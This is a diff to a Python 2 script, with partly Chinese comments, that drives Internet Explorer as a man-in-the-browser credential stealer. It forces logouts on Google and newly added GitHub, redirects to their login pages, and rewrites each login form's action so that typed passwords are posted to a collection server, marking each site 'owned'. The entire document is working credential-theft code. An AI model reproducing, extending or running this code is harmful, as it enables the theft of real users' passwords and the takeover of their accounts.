@@ -12,10 +12,10 @@ data_receiver = "http://localhost:8080/"
 
 target_sites  = {}
 
-# Facebook 的这种登出方式已经失效
-target_sites["www.facebook.com"] = {
+target_sites["github.com"] = {
     "logout_url": None,
-    "logout_form": "logout_form",
+    "logout_form": "/logout",
+    "login_url": "https://github.com/login",
     "login_form_index": 0,
     "owned": False
 }
@@ -23,6 +23,7 @@ target_sites["www.facebook.com"] = {
 target_sites["accounts.google.com"] = {
     "logout_url": "https://accounts.google.com/Logout?hl=en&continue=https://accounts.google.com/ServiceLogin%3Fservice%3Dmail",
     "logout_form": None,
+    "login_url": None,
     "login_form_index": 0,
     "owned": False
 }
@@ -63,16 +64,20 @@ while True:
                 for i in full_doc:
                     try:                        
                         # Find the logout form and submit it
-                        if i.id == target_sites[url.hostname]["logout_form"]:
+                        if i.action == target_sites[url.hostname]["logout_form"]:
                             i.submit()
                             wait_for_browser(browser)
                     except:
                         pass
             try:
+                # 跳转到指定的登陆地址
+                if target_sites[url.hostname]["login_url"]:
+                    browser.Navigate(target_sites[url.hostname]["login_url"])
+                    wait_for_browser(browser)
+                    
                 # Now we modify the login form
                 login_index = target_sites[url.hostname]["login_form_index"]
                 login_page = urllib.quote(browser.LocationUrl)
-                # browser.Document.forms[login_index].action = "%s%s" % (data_receiver, login_page)
                 browser.Document.forms[login_index].action = "%s%s" % (data_receiver, login_page)
                 print browser.Document.forms[login_index].action
                 target_sites[url.hostname]["owned"] = True 
